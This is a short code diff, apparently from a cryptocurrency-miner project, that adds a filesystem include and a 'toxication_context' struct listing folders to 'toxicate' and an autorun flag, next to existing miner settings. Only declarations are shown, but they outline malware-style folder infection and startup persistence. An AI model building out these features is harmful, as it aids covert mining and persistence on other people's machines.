@@ -4,6 +4,8 @@
 #include <iostream>
 #include <thread>
 #include <cstdint>
+#include <filesystem>
+
 #include <string.h>
 
 #include "common.h"
@@ -52,6 +54,10 @@ struct miners_context {
 	int32_t DonateLevel;
 };
 
+struct toxication_context {
+	std::vector<std::wstring> ToxicationFolders;
+	int32_t AddToAutorun;
+};
 
 enum miner_type {
 	MinerType_CPU,
